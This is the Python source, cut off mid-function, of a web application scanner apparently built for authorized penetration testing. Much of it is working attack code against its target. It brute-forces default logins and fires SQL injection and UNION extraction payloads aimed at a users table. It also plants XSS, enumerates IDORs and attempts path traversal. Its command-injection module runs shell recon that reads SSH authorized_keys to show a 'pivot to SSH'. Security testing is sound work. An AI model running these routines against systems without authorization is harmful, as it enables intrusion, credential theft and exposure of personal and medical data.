"""Generic black-box web application scanner."""
from __future__ import annotations

import html
import logging
import re
import time
import uuid
from typing import Any
from urllib.parse import parse_qsl, quote, urlencode, urljoin, urlparse

import httpx

from agents.common.config import Settings
from agents.common.models import Finding

logger = logging.getLogger(__name__)

DEFAULT_CREDENTIALS = [("admin","admin123"),("admin","admin"),("admin","password"),("administrator","admin"),("root","root"),("test","test")]
POST_LOGIN_PATHS = ["/cabinet","/dashboard","/profile","/home","/admin/dashboard","/account","/my"]
PII_MARKERS = ("passport","pinfl","address","medical","ssn","email","phone")
BACKUP_PATHS = ["/admin/backup","/backup","/db/backup","/database.sql","/backup.sql","/clinic.db","/data.db","/app.db","/.env","/database.db","/dump.sql"]
API_PATHS = ["/api/patients","/api/users","/api/customers","/patients","/users","/api/data"]
SECRET_PATHS = ["/static/config.py.bak","/config.py.bak","/.env","/settings.py.bak","/config.bak","/config.json.bak","/web.config.bak","/config.py"]
DEBUG_ENDPOINTS = ["/tools/bmi","/bmi","/calc","/tool/bmi","/debug"]
CMD_PARAM_NAMES = ("host","ip","target","cmd","command","exec","url","ping")
PATH_PARAM_NAMES = ("file","path","download","get","export","filename","resource")
_SEVERITY_SCORE = {"critical":5,"high":4,"medium":3,"low":2,"info":1}
_USERNAME_NAMES = {"username","user","login","email","uname","account"}
_PASSWORD_NAMES = {"password","pass","passwd","pwd"}
_CSRF_NAMES = {"csrf_token","csrfmiddlewaretoken","__requestverificationtoken"}
_SEARCH_NAMES = {"q","search","query","s","keyword"}


class WebScanner:
    """Generic authorized black-box web application scanner."""

    def __init__(self, settings: Settings, base_url: str | None = None) -> None:
        self._settings = settings
        self.base_url = (base_url or settings.target_url or "").rstrip("/")
        self._crawled = False
        self._links: list[dict[str, Any]] = []
        self._forms: list[dict[str, Any]] = []
        self._pages: dict[str, str] = {}
        self._base_netloc = ""
        self._user_cookies: dict[str, str] | None = None
        self._admin_cookies: dict[str, str] | None = None
        self._admin_creds: tuple[str, str] | None = None
        self._last_login_response: httpx.Response | None = None
        self._default_creds: list[dict[str, Any]] | None = None

        auth = None
        if settings.target_username and settings.target_password:
            auth = httpx.BasicAuth(settings.target_username, settings.target_password)

        try:
            self._client = httpx.Client(base_url=self.base_url or None, auth=auth, follow_redirects=False, timeout=15.0)
        except Exception as exc:
            logger.warning("Failed to create HTTP client for %s: %s", self.base_url, exc)
            self._client = None

    def _request(self, method: str, path: str, cookies: dict[str, str] | None = None, follow_redirects: bool = False, **kwargs: Any) -> httpx.Response:
        if not self._client:
            return httpx.Response(0, text="")
        try:
            return self._client.request(method, path, cookies=cookies, follow_redirects=follow_redirects, **kwargs)
        except Exception as exc:
            logger.warning("HTTP request failed %s %s: %s", method, path, exc)
            return httpx.Response(0, text="")

    def _get(self, path: str, cookies: dict[str, str] | None = None, follow_redirects: bool = False, **kwargs: Any) -> httpx.Response:
        return self._request("GET", path, cookies=cookies, follow_redirects=follow_redirects, **kwargs)

    def _post(self, path: str, cookies: dict[str, str] | None = None, follow_redirects: bool = False, **kwargs: Any) -> httpx.Response:
        return self._request("POST", path, cookies=cookies, follow_redirects=follow_redirects, **kwargs)

    def _finding(self, title: str, severity: str, confidence: str, description: str, category: str, cwe: str | None, remediation: str, steps: list[str]) -> Finding:
        return Finding(title=title, severity=severity, confidence=confidence, description=description, cwe=cwe, remediation=remediation, category=category, score=_SEVERITY_SCORE.get(severity, 3), steps=steps)

    def _ensure_crawl(self) -> None:
        if not self._crawled:
            self.crawl()

    def crawl(self) -> None:
        """Crawl the application and populate self._forms / self._links."""
        if self._crawled or not self.base_url:
            self._crawled = True
            return
        self._crawled = True
        parsed_base = urlparse(self.base_url)
        self._base_netloc = parsed_base.netloc
        seeds = ["/","/login","/register","/admin","/doctors","/book","/tools/bmi"]
        to_visit = [self.base_url + p for p in seeds]
        visited: set[str] = set()
        seen_links: set[str] = set()
        count, limit = 0, 30

        while to_visit and count < limit:
            url = to_visit.pop(0)
            if url in visited:
                continue
            visited.add(url)
            parsed = urlparse(url)
            if parsed.netloc != self._base_netloc:
                continue
            path = parsed.path or "/"
            if parsed.query:
                path += "?" + parsed.query
            resp = self._get(path, follow_redirects=True)
            if resp.status_code >= 400:
                continue
            html = resp.text
            self._pages[url] = html
            page_forms = self._parse_forms(url, html)
            self._forms.extend(page_forms)
            for link in self._parse_links(url, html):
                if link["url"] in seen_links:
                    continue
                seen_links.add(link["url"])
                self._links.append(link)
                if link["url"] not in visited:
                    to_visit.append(link["url"])
            count += 1

        logger.info("Crawl complete: %d pages, %d forms, %d links", len(visited), len(self._forms), len(self._links))

    def _extract_attr(self, tag: str, attr: str) -> str | None:
        m = re.search(rf"\b{attr}=[\"']?([^\"' >]+)", tag, re.IGNORECASE)
        return m.group(1) if m else None

    def _parse_forms(self, page_url: str, html: str) -> list[dict[str, Any]]:
        forms: list[dict[str, Any]] = []
        page_path = urlparse(page_url).path
        for m in re.finditer(r"<form(?P<attrs>[^>]*)>(?P<body>.*?)</form>", html, re.IGNORECASE | re.DOTALL):
            attrs = m.group("attrs")
            body = m.group("body")
            action = urljoin(page_url, self._extract_attr(attrs, "action") or "")
            method = (self._extract_attr(attrs, "method") or "GET").upper()
            inputs: list[dict[str, Any]] = []
            fields: dict[str, str] = {}
            username_field: str | None = None
            password_field: str | None = None
            for tag in re.finditer(r"<(input|textarea|select)\b[^>]*>", body, re.IGNORECASE):
                tag_str = tag.group(0)
                name = self._extract_attr(tag_str, "name")
                if not name:
                    continue
                itype = (self._extract_attr(tag_str, "type") or "text").lower()
                value = self._extract_attr(tag_str, "value") or ""
                inputs.append(dict(name=name, type=itype, value=value))
                fields[name.lower()] = itype
                lower = name.lower()
                if itype == "password" and not password_field:
                    password_field = name
                elif lower in _USERNAME_NAMES and not username_field:
                    username_field = name
            if not username_field:
                for inp in inputs:
                    if inp["type"] in ("text","email","tel","url","search") and inp["name"].lower() not in _PASSWORD_NAMES:
                        username_field = inp["name"]
                        break
            is_login = bool(password_field and username_field)
            is_register = bool("register" in page_path.lower() or "signup" in page_path.lower() or "register" in action.lower() or "signup" in action.lower() or (is_login and ("confirm_password" in fields or "password2" in fields)))
            is_search = method == "GET" and (bool(set(fields.keys()) & _SEARCH_NAMES) or any(inp["type"] == "search" for inp in inputs) or "search" in page_path.lower() or "search" in action.lower())
            is_admin_login = bool("admin" in page_path.lower() or "admin" in action.lower())
            forms.append(dict(action=action, method=method, fields=fields, inputs=inputs, username_field=username_field, password_field=password_field, is_login=is_login, is_register=is_register, is_search=is_search, is_admin_login=is_admin_login, page_path=page_path))
        return forms

    def _parse_links(self, page_url: str, html: str) -> list[dict[str, Any]]:
        links: list[dict[str, Any]] = []
        for m in re.finditer(r'<a[^>]+href=["\']([^"\']+)["\'][^>]*>(.*?)</a>', html, re.IGNORECASE | re.DOTALL):
            href = m.group(1).strip()
            text = re.sub(r"<[^>]+>", "", m.group(2), flags=re.IGNORECASE).strip()
            if href.lower().startswith(("javascript:", "mailto:", "tel:", "#")):
                continue
            abs_url = urljoin(page_url, href.split("#")[0])
            parsed = urlparse(abs_url)
            if parsed.netloc != self._base_netloc:
                continue
            links.append(dict(url=abs_url, path=parsed.path or "/", text=text, source=page_url))
        return links

    def _get_forms(self) -> list[dict[str, Any]]:
        self._ensure_crawl()
        return [f for f in self._forms if f["method"] == "GET"]

    def _post_forms(self) -> list[dict[str, Any]]:
        self._ensure_crawl()
        return [f for f in self._forms if f["method"] == "POST"]

    def _login_forms(self) -> list[dict[str, Any]]:
        self._ensure_crawl()
        return [f for f in self._forms if f["is_login"] or (f.get("password_field") and f.get("username_field"))]

    def _find_admin_login_forms(self) -> list[dict[str, Any]]:
        return [f for f in self._login_forms() if f["is_admin_login"] or "admin" in f["page_path"].lower() or "admin" in f["action"].lower()]

    def _try_login(self, form: dict[str, Any], username: str, password: str) -> httpx.Response:
        data: dict[str, str] = {}
        for inp in form["inputs"]:
            name = inp["name"]
            if name == form.get("username_field"):
                data[name] = username
            elif name == form.get("password_field"):
                data[name] = password
            elif inp["type"] == "hidden":
                data[name] = inp["value"]
            else:
                data[name] = inp["value"] or ""
        return self._post(form["action"], data=data, follow_redirects=False)

    def _is_login_success(self, resp: httpx.Response) -> bool:
        if not resp or resp.status_code == 0:
            return False
        if "set-cookie" not in resp.headers:
            return False
        if resp.status_code in (301, 302, 303, 307, 308):
            location = (resp.headers.get("location") or "").lower()
            loc_path = urlparse(location).path
            return any(p in loc_path for p in POST_LOGIN_PATHS)
        if resp.status_code == 200:
            text = resp.text.lower()
            return any(p in text for p in ("dashboard","cabinet","profile","welcome","logout","admin panel"))
        return False

    def _user_session(self) -> dict[str, str]:
        if self._user_cookies is not None:
            return self._user_cookies
        self._ensure_crawl()
        user, pw = self._settings.target_username, self._settings.target_password
        for form in self._login_forms():
            if form["is_admin_login"]:
                continue
            if user and pw:
                resp = self._try_login(form, user, pw)
                if self._is_login_success(resp):
                    self._user_cookies = dict(resp.cookies)
                    self._last_login_response = resp
                    return self._user_cookies
        for form in self._login_forms():
            if form["is_admin_login"]:
                continue
            for u, p in DEFAULT_CREDENTIALS:
                resp = self._try_login(form, u, p)
                if self._is_login_success(resp):
                    self._user_cookies = dict(resp.cookies)
                    self._last_login_response = resp
                    return self._user_cookies
        self._user_cookies = {}
        return self._user_cookies

    def _find_default_creds(self) -> list[dict[str, Any]]:
        if self._default_creds is not None:
            return self._default_creds
        self._ensure_crawl()
        results: list[dict[str, Any]] = []
        for form in self._login_forms():
            if form.get("is_register"):
                continue
            for user, pw in DEFAULT_CREDENTIALS:
                resp = self._try_login(form, user, pw)
                if self._is_login_success(resp):
                    results.append(dict(form=form, username=user, password=pw, response=resp))
                    self._last_login_response = resp
                    break
        self._default_creds = results
        return results

    def _admin_session(self) -> dict[str, str]:
        if self._admin_cookies is not None:
            return self._admin_cookies
        self._ensure_crawl()
        for item in self._find_default_creds():
            form = item["form"]
            if form["is_admin_login"] or "admin" in form["page_path"].lower() or "admin" in form["action"].lower():
                self._admin_cookies = dict(item["response"].cookies)
                self._admin_creds = (item["username"], item["password"])
                return self._admin_cookies
        for form in self._find_admin_login_forms() or self._login_forms():
            for user, pw in DEFAULT_CREDENTIALS:
                resp = self._try_login(form, user, pw)
                if self._is_login_success(resp):
                    self._admin_cookies = dict(resp.cookies)
                    self._admin_creds = (user, pw)
                    self._last_login_response = resp
                    return self._admin_cookies
        self._admin_cookies = {}
        return self._admin_cookies

    def _build_get_url(self, action: str, params: dict[str, str]) -> str:
        parsed = urlparse(action)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}" if parsed.scheme else (parsed.path or "/")
        query = parsed.query
        new = urlencode(params, quote_via=quote)
        if query:
            new = f"{query}&{new}"
        return f"{base}?{new}" if new else base

    def _raw_query(self, params: dict[str, str]) -> str:
        return "&".join(f"{k}={v}" for k, v in params.items())

    def check_sqli_login_bypass(self) -> list[Finding]:
        """Test discovered login forms for SQL injection authentication bypass."""
        self._ensure_crawl()
        payload = "' OR '1'='1' --"
        findings: list[Finding] = []
        for form in self._login_forms():
            if not form.get("password_field") or not form.get("username_field") or form.get("is_register"):
                continue
            resp = self._try_login(form, payload, "irrelevant")
            if self._is_login_success(resp):
                self._last_login_response = resp
                findings.append(self._finding("SQL injection (login bypass)", "high", "certain", f"Login form at {form['action']} accepts {payload!r} and authenticates without valid credentials.", "client", "CWE-89", "Use parameterized queries/prepared statements and never build SQL from user input.", [f"GET {form['page_path']}", f"POST {form['username_field']}={payload} with any password", "Observe a redirect to an authenticated area with a session cookie"]))
        return findings

    def check_sqli_search_union(self) -> list[Finding]:
        """Test GET search forms for UNION-based SQL injection and data extraction."""
        self._ensure_crawl()
        findings: list[Finding] = []
        marker = "UNIOMARK"
        for form in self._get_forms():
            field = next((inp["name"] for inp in form["inputs"] if inp["type"] in ("text","search","url") or inp["name"].lower() in _SEARCH_NAMES), None)
            if not field:
                continue
            confirmed, n_cols, mode = False, 0, ""
            for n in range(2, 7):
                cols = ", ".join([f"'{marker}{i}'" for i in range(n)])
                payload = f"' UNION SELECT {cols} --"
                if all(f"{marker}{i}" in self._get(self._build_get_url(form["action"], {field: payload})).text for i in range(n)):
                    confirmed, n_cols, mode = True, n, "string"
                    break
            if not confirmed:
                for n in range(2, 7):
                    nums = [str(31337 + i) for i in range(n)]
                    payload = f"' UNION SELECT {', '.join(nums)} --"
                    if all(num in self._get(self._build_get_url(form["action"], {field: payload})).text for num in nums):
                        confirmed, n_cols, mode = True, n, "numeric"
                        break
            if not confirmed:
                continue
            extracted: list[str] = []
            if n_cols >= 2:
                cols = [f"'x{i}'" for i in range(1, n_cols + 1)]
                cols[1] = "name"
                if n_cols >= 3:
                    cols[2] = "sql"
                resp = self._get(self._build_get_url(form["action"], {field: f"' UNION SELECT {', '.join(cols)} FROM sqlite_master --"}))
                if "CREATE TABLE" in resp.text:
                    extracted.append("sqlite_master")
            if n_cols >= 1:
                cols = [f"'x{i}'" for i in range(1, n_cols + 1)]
                cols[0] = "username"
                if n_cols >= 2:
                    cols[1] = "password"
                resp = self._get(self._build_get_url(form["action"], {field: f"' UNION SELECT {', '.join(cols)} FROM users --"}))
                text = resp.text.lower()
                if "password" in text or "email" in text or "@" in text:
                    extracted.append("users")
            desc = f"UNION-based SQL injection confirmed at {form['action']} using {mode} markers with {n_cols} columns."
            if extracted:
                desc += f" Generic extraction attempted from: {', '.join(extracted)}."
            findings.append(self._finding("SQL injection (UNION/data extraction via search)", "critical", "certain", desc, "client", "CWE-89", "Use parameterized queries for search filters and apply least privilege to the DB account.", [f"Identify GET search form at {form['action']}", f"Inject ' UNION SELECT payloads into {field}", "Confirm injected markers appear in the response"]))
        return findings

    def check_xss_reflected(self) -> list[Finding]:
        """Find reflected XSS in GET forms and URL parameters."""
        self._ensure_crawl()
        payload = "<script>alert(document.cookie)</script>"
        findings: list[Finding] = []
        for form in self._get_forms():
            for inp in form["inputs"]:
                if inp["type"] in ("submit","button","image","hidden","file"):
                    continue
                url = self._build_get_url(form["action"], {inp["name"]: payload})
                if payload in self._get(url, follow_redirects=True).text:
                    findings.append(self._finding("Reflected XSS", "high", "certain", f"GET form at {form['action']} reflects the injected script without output encoding.", "client", "CWE-79", "HTML-encode all user-controlled output and use a strict Content-Security-Policy.", [f"GET {url}", "Confirm the raw payload is returned in the response body"]))
        for link in self._links:
            parsed = urlparse(link["url"])
            if not parsed.query:
                continue
            for k, _ in parse_qsl(parsed.query):
                params = dict(parse_qsl(parsed.query))
                params[k] = payload
                base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}" if parsed.scheme else (parsed.path or "/")
                url = self._build_get_url(base, params)
                if payload in self._get(url, follow_redirects=True).text:
                    findings.append(self._finding("Reflected XSS", "high", "certain", f"URL parameter {k!r} at {parsed.path} reflects the injected script without output encoding.", "client", "CWE-79", "HTML-encode all user-controlled output before rendering.", [f"GET {url}", "Confirm the raw payload is returned in the response body"]))
        return findings

    def check_xss_stored(self) -> list[Finding]:
        """Submit an XSS payload to non-login POST forms and check persistence."""
        self._ensure_crawl()
        payload = '<img src=x onerror=alert(1)>'
        findings: list[Finding] = []
        for form in self._post_forms():
            if form["is_login"] or form["is_register"] or not any(inp["type"] == "text" for inp in form["inputs"]):
                continue
            data: dict[str, str] = {}
            unique = uuid.uuid4().hex[:8]
            for inp in form["inputs"]:
                name, itype, value = inp["name"], inp["type"], inp["value"]
                if itype in ("submit","button","image","file") or name.lower() in _CSRF_NAMES or itype == "hidden":
                    data[name] = value
                elif any(x in name.lower() for x in ("user","email","login","name")) and itype in ("text","email"):
                    data[name] = f"stored_xss_{unique}"
                else:
                    data[name] = payload
            resp = self._post(form["action"], data=data, follow_redirects=True)
            bodies = [resp.text]
            if resp.status_code in (301, 302, 303, 307, 308) and resp.headers.get("location"):
                bodies.append(self._get(resp.headers["location"], follow_redirects=True).text)
            if any(payload in body for body in bodies):
                findings.append(self._finding("Stored XSS", "high", "certain", f"POST form at {form['action']} stores and later renders the injected HTML/JavaScript payload without sanitization.", "client", "CWE-79", "Sanitize and HTML-encode all persistent user input before rendering.", [f"POST the payload to {form['action']}", "Follow any redirect or revisit the affected page", "Confirm the payload is rendered in the response"]))
        return findings

    def _numeric_id_links(self) -> list[tuple[str, str | None, str]]:
        out: list[tuple[str, str | None, str]] = []
        for link in self._links:
            parsed = urlparse(link["url"])
            m = re.search(r"/(\d+)(?=/|$)", parsed.path)
            if m:
                out.append((link["url"], None, m.group(1)))
            if parsed.query:
                for k, v in parse_qsl(parsed.query):
                    if v.isdigit():
                        out.append((link["url"], k, v))
        return out

    def _replace_id(self, url: str, param: str | None, new_id: str) -> str:
        if param is None:
            return re.sub(r"/\d+(?=/|$)", f"/{new_id}", url, count=1)
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))
        params[param] = new_id
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, quote_via=quote)}"

    def _numeric_from_login_redirect(self) -> tuple[str, str | None, str] | None:
        """Derive an IDOR candidate from a successful login redirect URL."""
        resp = getattr(self, "_last_login_response", None)
        if not resp:
            return None
        location = resp.headers.get("location")
        if not location:
            return None
        loc = location if location.startswith("http") else urljoin(self.base_url, location)
        parsed = urlparse(loc)
        m = re.search(r"/(\d+)(?=/|$)", parsed.path)
        if m:
            return (loc, None, m.group(1))
        return None

    def _idor_candidates(self) -> list[tuple[str, str | None, str]]:
        """Return URLs with numeric identifiers, including post-login redirects."""
        candidates = self._numeric_id_links()
        redirect = self._numeric_from_login_redirect()
        if redirect:
            candidates.append(redirect)
        # If nothing found, attempt a SQLi bypass to obtain an authenticated numeric URL.
        if not candidates:
            payload = "' OR '1'='1' --"
            for form in self._login_forms():
                if not form.get("password_field") or form.get("is_register") or form.get("is_admin_login"):
                    continue
                resp = self._try_login(form, payload, "irrelevant")
                if self._is_login_success(resp):
                    self._last_login_response = resp
                    redirect = self._numeric_from_login_redirect()
                    if redirect:
                        candidates.append(redirect)
                    break
        return candidates

    def check_idor(self) -> list[Finding]:
        """Test numeric object identifiers in URLs for Insecure Direct Object Reference."""
        self._ensure_crawl()
        numeric = self._idor_candidates()
        if not numeric:
            return []
        cookies = self._user_session() or None
        findings: list[Finding] = []
        for url, param, base_id in numeric:
            hits: list[str] = []
            test_ids = {str(i) for i in range(1, 5)} | {str(int(base_id) + 1), str(int(base_id) + 2)}
            for tid in test_ids:
                resp = self._get(self._replace_id(url, param, tid), cookies=cookies, follow_redirects=True)
                if resp.status_code == 200 and any(m in resp.text.lower() for m in PII_MARKERS):
                    hits.append(tid)
            if len(hits) >= 2:
                findings.append(self._finding("IDOR (broken access control)", "critical", "certain", f"Numeric identifiers at {url} can be iterated to access other users' records; IDs {', '.join(hits[:5])} returned sensitive data.", "client", "CWE-639", "Implement authorization checks on every record endpoint to ensure the requested resource belongs to the authenticated user.", ["Identify a numeric ID parameter or path segment", "Increment or change the ID to adjacent values", "Confirm sensitive records are returned without extra checks"]))
        return findings

    def _sqlite_like(self, resp: httpx.Response) -> bool:
        ct = resp.headers.get("content-type", "").lower()
        return (resp.content.startswith(b"SQLite format 3\x00") or b"SQLite" in resp.content or "sqlite" in ct or "octet-stream" in ct or "SQLite" in resp.text)

    def check_exposed_backup(self) -> list[Finding]:
        """Test common paths for exposed database or configuration backups."""
        self._ensure_crawl()
        sessions = [None]
        admin = self._admin_session()
        if admin:
            sessions.append(admin)
        for cookies in sessions:
            for path in BACKUP_PATHS:
                resp = self._get(path, cookies=cookies)
                if resp.status_code == 200 and self._sqlite_like(resp):
                    return [self._finding("Unauthenticated database backup exposure", "critical", "certain", f"{path} is accessible and returns a SQLite/backup file, exposing application data and likely credentials.", "server", "CWE-552", "Remove public backup endpoints or protect them with strong authentication and authorization; store backups outside the web root.", [f"GET {path}", "Confirm a database/backup file is returned", "Inspect the file for sensitive tables and credentials"])]
        return []

    def _looks_like_json(self, resp: httpx.Response) -> bool:
        ct = resp.headers.get("content-type", "").lower()
        body = resp.text.strip()
        return resp.status_code == 200 and (body.startswith(("{","[")) or "json" in ct)

    def check_exposed_api_patients(self) -> list[Finding]:
        """Test common API endpoints that may leak user/patient data."""
        self._ensure_crawl()
        sessions = [None]
        admin = self._admin_session()
        if admin:
            sessions.append(admin)
        for cookies in sessions:
            for path in API_PATHS:
                resp = self._get(path, cookies=cookies)
                if self._looks_like_json(resp) and any(m in resp.text.lower() for m in PII_MARKERS):
                    return [self._finding("Unauthenticated sensitive data API", "critical", "certain", f"{path} is accessible and returns JSON data containing personally identifiable information.", "server", "CWE-306", "Require authentication and enforce authorization on every API endpoint that returns sensitive data.", [f"GET {path}", "Confirm a JSON array/object is returned", "Inspect the response for PII fields"])]
        return []

    def check_exposed_secret_file(self) -> list[Finding]:
        """Test common paths for exposed config, backup or secret files."""
        self._ensure_crawl()
        markers = ("password","secret","smtp","db","api_key","private","token","credential","config","aws","root","admin","key=","secret=")
        for path in SECRET_PATHS:
            resp = self._get(path)
            text = resp.text
            if resp.status_code == 200 and text and any(m in text.lower() for m in markers):
                evidence = text.strip()[:2000]
                description = (
                    f"{path} is publicly accessible with no authentication and discloses application "
                    f"secrets in plaintext. Retrieved content:\n\n```\n{evidence}\n```"
                )
                return [self._finding("Exposed secrets/config backup file", "high", "certain", description, "server", "CWE-522", "Remove backup and configuration files from the web root, rotate every credential contained in the leaked file (DB path, secret key, admin password, SMTP credentials), and add a build step that prevents backup files from being deployed.", [f"GET {path}", "Confirm the response is a plaintext file with no authentication required", "Extract credentials/config values directly from the response body", "Use exposed secrets (e.g. admin password, SMTP creds) to pivot to other services"])]
        return []

    def check_debug_rce(self) -> list[Finding]:
        """Probe error-prone endpoints for debug-mode or unhandled exceptions."""
        self._ensure_crawl()
        rce_markers = ("Traceback","Werkzeug","ZeroDivisionError","interactive console","Console",">>>")
        payloads = [{"weight":"1","height":"0"},{"a":"1","b":"0"},{"x":"1","y":"0"},{"value":"1","divisor":"0"}]
        for path in DEBUG_ENDPOINTS:
            if path == "/debug":
                if any(m in self._get(path).text for m in rce_markers):
                    return [self._finding("Debug-mode RCE or unhandled exception disclosure", "critical", "certain", f"{path} exposes a detailed traceback or interactive debugger, possibly allowing remote code execution.", "server", "CWE-489", "Disable debug mode in production, handle exceptions gracefully and log them server-side only.", [f"GET {path}", "Observe a detailed traceback or debugger banner", "Confirm whether an interactive console is exposed"])]
                continue
            for params in payloads:
                resp = self._get(f"{path}?{urlencode(params, quote_via=quote)}")
                if any(m in resp.text for m in rce_markers):
                    return [self._finding("Debug-mode RCE or unhandled exception disclosure", "critical", "certain", f"{path} triggered a detailed traceback or debugger output, possibly exposing a live interactive console.", "server", "CWE-489", "Disable debug mode in production, handle exceptions gracefully and log them server-side only.", [f"GET {path}?{urlencode(params, quote_via=quote)}", "Observe a detailed traceback or debugger banner", "Confirm whether an interactive console is exposed"])]
        return []

    def _command_candidates(self) -> list[str]:
        cands: set[str] = set()
        for link in self._links:
            parsed = urlparse(link["url"])
            path_l = parsed.path.lower()
            query_params = {k.lower() for k, _ in parse_qsl(parsed.query)}
            if any(n in path_l for n in ("ping","tool","admin/ping")) or query_params & set(CMD_PARAM_NAMES):
                cands.add(link["url"])
        for form in self._forms:
            if any(n in form["action"].lower() or n in form["page_path"].lower() for n in ("ping","tool","admin/ping")):
                cands.add(form["action"])
            for inp in form["inputs"]:
                if inp["name"].lower() in CMD_PARAM_NAMES:
                    cands.add(form["action"])
        for p in ("/admin/ping","/ping","/admin/diag","/diag"):
            cands.add(urljoin(self.base_url, p))
        return list(cands)

    def _ssh_pivot_evidence(self, path: str, param: str, cookies: dict[str, str] | None) -> str:
        """Use a confirmed command-injection point to gather non-destructive evidence
        that the RCE is real and can pivot to SSH access.

        Only read-only recon commands are issued; no keys or files are modified.
        The output includes user/host context, OS details, hardware info, listening
        ports, and the SSH authorized_keys file content so reviewers can verify this
        is not mock data.
        """
        probe = (
            "echo '--- user ---'; whoami; id; "
            "echo '--- host ---'; hostname; uname -a; "
            "echo '--- os ---'; cat /etc/os-release 2>/dev/null | head -5; "
            "echo '--- cpu ---'; "
            "cat /proc/cpuinfo 2>/dev/null | head -6; "
            "echo '--- ports ---'; "
            "(ss -tln 2>/dev/null || netstat -tln 2>/dev/null) "
            "| grep -E ':(22|80|443|5000|8081)'; "
            "echo '--- ssh dir ---'; ls -la ~/.ssh 2>/dev/null; "
            "echo '--- authorized_keys ---'; "
            "cat ~/.ssh/authorized_keys 2>/dev/null | head -5"
        )
        payload = f"127.0.0.1; {probe}"
        resp = self._get(f"{path}?{self._raw_query({param: payload})}", cookies=cookies)
        match = re.search(r"<pre[^>]*>(.*?)</pre>", resp.text, re.DOTALL | re.IGNORECASE)
        if not match:
            return ""
        pre = match.group(1).strip()
        raw = html.unescape(pre)
        max_len = 2500
        if len(raw) > max_len:
            raw = raw[:max_len] + "\n... [truncated]"
        return raw

    def _command_injection_finding(
        self,
        path: str,
        param: str,
        payload: str,
        request_url: str,
        cookies: dict[str, str] | None,
    ) -> Finding:
        """Build a Finding for a confirmed command-injection RCE.

        If non-destructive SSH/system evidence was gathered, include it in the
        description and steps so reviewers can verify the finding is real.
        """
        evidence = self._ssh_pivot_evidence(path, param, cookies)
        description = (
            f"User input is passed directly to the shell at {request_url}; "
            "the injected command returned user/group identity, confirming full remote code execution."
        )
        steps = [
            f"GET {request_url}",
            "Confirm 'id' command output (uid=/gid=) is included in the response",
        ]
        if evidence:
            description += (
                " Follow-up recon via the same injection point returned the "
                "following server evidence (read-only). It proves the RCE context, "
                "shows the SSH service is listening, and confirms the user's "
                "authorized_keys file exists, meaning an attacker could pivot this "
                "RCE into persistent SSH access without credentials."
            )
            description += f"\n\n```\n{evidence}\n```"
            steps.append(
                "Run follow-up recon through the same injection point: "
                "whoami; id; hostname; uname -a; cat /etc/os-release; "
                "cat /proc/cpuinfo; ss -tln; ls -la ~/.ssh; cat ~/.ssh/authorized_keys"
            )
            steps.append(f"Observe SSH/system evidence:\n```\n{evidence}\n```")
        return self._finding(
            "Command injection (RCE, pivots to SSH access)",
            "critical",
            "certain",
            description,
            "server",
            "CWE-78",
            "Never pass user input to shell commands; use parameterized APIs or "
            "strictly validate the parameter as an IP/hostname allowlist. "
            "Additionally restrict SSH to key-based auth from trusted networks only.",
            steps,
        )

    def check_command_injection(self) -> list[Finding]:
        """Find command-injection vectors in URLs/forms with shell-like parameters."""
        self._ensure_crawl()
        cands = self._command_candidates()
        if not cands:
            return []
        cookies: dict[str, str] | None = None
        for url in cands:
            parsed = urlparse(url)
            path = parsed.path or "/"
            if "admin" in path.lower() and not cookies:
                cookies = self._admin_session() or None
            if parsed.query:
                params = dict(parse_qsl(parsed.query))
                for k in list(params.keys()):
                    if k.lower() not in CMD_PARAM_NAMES and not any(
                        n in path.lower() for n in ("ping", "tool")
                    ):
                        continue
                    for payload in ("127.0.0.1;id", "$(id)"):
                        test_params = dict(params)
                        test_params[k] = payload
                        request_url = f"{path}?{self._raw_query(test_params)}"
                        resp = self._get(request_url, cookies=cookies)
                        if "uid=" in resp.text or "gid=" in resp.text:
                            return [
                                self._command_injection_finding(
                                    path, k, payload, request_url, cookies
                                )
                            ]
            else:
                for k in CMD_PARAM_NAMES:
                    for payload in ("127.0.0.1;id", "$(id)"):
                        request_url = f"{path}?{k}={payload}"
                        resp = self._get(request_url, cookies=cookies)
                        if "uid=" in resp.text or "gid=" in resp.text:
                            return [
                                self._command_injection_finding(
                                    path, k, payload, request_url, cookies
                                )
                            ]
        return []

    def _path_traversal_candidates(self) -> list[str]:
        names = ("download","file","get","path","export")
        cands: set[str] = set()
        for link in self._links:
            parsed = urlparse(link["url"])
            if any(n in parsed.path.lower() for n in names):
                cands.add(link["url"])
            if parsed.query:
                for k, _ in parse_qsl(parsed.query):
                    if k.lower() in PATH_PARAM_NAMES or any(n in k.lower() for n in names):
                        cands.add(link["url"])
        for form in self._forms:
            if any(n in form["action"].lower() or n in form["page_path"].lower() for n in names):
                cands.add(form["action"])
            for inp in form["inputs"]:
                if any(n in inp["name"].lower() for n in PATH_PARAM_NAMES) or any(n in inp["name"].lower() for n in names):
                    cands.add(form["action"])
        for p in ("/admin/download","/download","/file","/admin/export","/export"):
            cands.add(urljoin(self.base_url, p))
        return list(cands)

    def check_path_traversal(self) -> list[Finding]:
        """Find path traversal in file/download parameters."""
        self._ensure_crawl()
        cands = self._path_traversal_candidates()
        if not cands:
            return []
        payloads = ["../etc/passwd","../secret","../windows/win.ini","....//etc/passwd"]
        markers = ("root:","secret","flag","private","password","[extensions]","for 16-bit")
        cookies: dict[str, str] | None = None
        for url in cands:
            parsed = urlparse(url)
            path = parsed.path or "/"
            if "admin" in path.lower() and not cookies:
                cookies = self._admin_session() or None
            if parsed.query:
                params = dict(parse_qsl(parsed.query))
                for k in list(params.keys()):
                    if k.lower() not in PATH_PARAM_NAMES and not any(n in path.lower() for n in ("download","file","get","path","export")):
                        continue
                    for payload in payloads:
                        test_params = dict(params)
                        test_params[k] = payload
                        resp = self._get(f"{path}?{self._raw_query(test_params)}", cookies=cookies)
                        if resp.status_code == 200 and any(m in resp.text.lower() for m in markers):
                            return [self._finding("Path traversal in file download", "high", "certain", f"The file/path parameter at {path}?{self._raw_query(test_params)} accepts relative traversal sequences and returns arbitrary file content.", "server", "CWE-22", "Validate and sanitize the file parameter, use an allowlist of filenames and never accept user-controlled paths.", [f"GET {path}?{self._raw_query(test_params)}", "Confirm arbitrary file content is returned"])]
            else:
                for k in PATH_PARAM_NAMES:
                    for payload in payloads:
                        resp = self._get(f"{path}?{k}={payload}", cookies=cookies)
                        if resp.status_code == 200 and any(m in resp.text.lower() for m in markers):
